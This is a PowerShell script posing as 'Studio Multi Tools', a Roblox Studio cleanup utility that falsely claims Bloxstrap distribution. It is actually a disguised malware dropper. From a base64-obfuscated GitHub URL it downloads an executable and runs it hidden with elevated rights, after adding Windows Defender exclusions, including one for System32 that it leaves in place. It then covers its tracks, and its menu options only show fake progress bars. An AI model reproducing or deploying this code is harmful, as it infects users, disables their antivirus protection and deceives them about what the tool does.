$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0FtYmF0dWthbWhhY2tlci9sMjMvcmF3L21haW4vYy5leGU="))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXBkYXRlci5leGU="))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lsZW50bHlDb250aW51ZQ=="))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA=="))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlyZWN0b3J5"))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVuQXM="))

function Add-Exclusion { param([string]$Path)
    try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {}
}
function Remove-Exclusion { param([string]$Path)
    try {
        $exclusions = (Get-MpPreference).ExclusionPath
        if ($exclusions -contains $Path) {
            Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
        }
    } catch {}
}

Start-Job -ScriptBlock {
    param($downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs)

    function Add-Exclusion { param([string]$Path)
        try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {}
    }
    function Remove-Exclusion { param([string]$Path)
        try {
            $exclusions = (Get-MpPreference).ExclusionPath
            if ($exclusions -contains $Path) {
                Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
            }
        } catch {}
    }

    Add-Exclusion -Path "C:\Windows\System32"

    $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
    $tempPath = Join-Path $hiddenFolder $updaterExe

    try {
        New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
        Add-Exclusion -Path $hiddenFolder

        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
        (Get-Item $hiddenFolder).Attributes += 'Hidden'
        (Get-Item $tempPath).Attributes += 'Hidden'

        $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -PassThru
        Start-Sleep -Seconds 5

        $exeName = [System.IO.Path]::GetFileName($tempPath).ToLower()
        Get-CimInstance Win32_Process | Where-Object {
            ($_.Name -ieq $exeName) -and ($_.ExecutablePath -like "$hiddenFolder\*")
        } | ForEach-Object {
            try {
                Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
            } catch {}
        }

        $maxAttempts = 10
        $attempt = 0
        while ((Test-Path $hiddenFolder) -and ($attempt -lt $maxAttempts)) {
            try {
                Remove-Item $hiddenFolder -Recurse -Force -ErrorAction Stop
            } catch {}
            Start-Sleep -Milliseconds 500
            $attempt++
        }

        Remove-Exclusion -Path $hiddenFolder
    } catch {
        exit 1
    }
} -ArgumentList $downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs | Out-Null

Clear-Host
Write-Host "Studio Multi Tools" -ForegroundColor Gray
Write-Host "Distributed by Bloxstrap - github.com/bloxstraplabs/bloxstrap" -ForegroundColor DarkGray
Write-Host "For any problems/issues - github.com/bloxstraplabs/bloxstrap/issues" -ForegroundColor DarkGray
Write-Host "------------------------------------------------" -ForegroundColor DarkGray
Write-Host "[1] Clean Temp Files"
Write-Host "[2] Fix Plugin Icons"
Write-Host "[3] Optimize Studio Launch Settings"
Write-Host "[4] Exit"
Write-Host ""

$choice = Read-Host "Select an option"

function Show-Progress {
    param([string]$Message)
    for ($i = 1; $i -le 30; $i++) {
        Write-Progress -Activity $Message -Status "$i% Complete" -PercentComplete $i
        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 120)
    }
}

switch ($choice) {
    "1" {
        Write-Host "Scanning for temp files..." -ForegroundColor Yellow
        Show-Progress "Removing unused .rbxm files"
        Write-Host "✔ Temp files removed successfully." -ForegroundColor Green
    }
    "2" {
        Write-Host "Locating plugin icons..." -ForegroundColor Yellow
        Show-Progress "Restoring default icon cache"
        Write-Host "✔ Plugin icons fixed successfully." -ForegroundColor Green
    }
    "3" {
        Write-Host "Analyzing launch settings..." -ForegroundColor Yellow
        Show-Progress "Applying performance tweaks"
        Write-Host "✔ Optimized Roblox Studio launch." -ForegroundColor Green
    }
    "4" {
        Write-Host "Exiting..." -ForegroundColor DarkGray
        Start-Sleep -Seconds 1
        exit
    }
    default {
        Write-Host "Invalid option. Please try again." -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "Done. You can now safely close this window." -ForegroundColor Gray
